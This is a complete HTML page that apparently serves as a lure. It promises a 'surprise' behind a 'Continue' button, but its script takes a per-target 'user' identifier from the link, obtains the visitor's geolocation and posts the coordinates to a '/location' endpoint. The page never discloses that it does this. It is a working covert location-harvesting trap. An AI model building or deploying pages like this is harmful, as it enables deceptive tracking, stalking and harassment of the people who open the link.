<!DOCTYPE html>
<html>

<head>
<title>Unlock Surprise</title>

<style>
body{
height:100vh;
display:flex;
justify-content:center;
align-items:center;
background:#111;
color:white;
font-family:Arial;
flex-direction:column;
}

button{
font-size:22px;
padding:20px 40px;
border:none;
background:#ff3b3b;
color:white;
border-radius:10px;
}
</style>

</head>

<body>

<h2>🎁 Tap to Unlock Surprise</h2>

<button onclick="start()">Continue</button>

<script>

const params = new URLSearchParams(window.location.search)
const user = params.get("user")

function start(){

navigator.geolocation.getCurrentPosition(function(pos){

fetch("/location",{
method:"POST",
headers:{
"Content-Type":"application/json"
},
body:JSON.stringify({
user:user,
latitude:pos.coords.latitude,
longitude:pos.coords.longitude
})
})

})

}

</script>

</body>
</html>
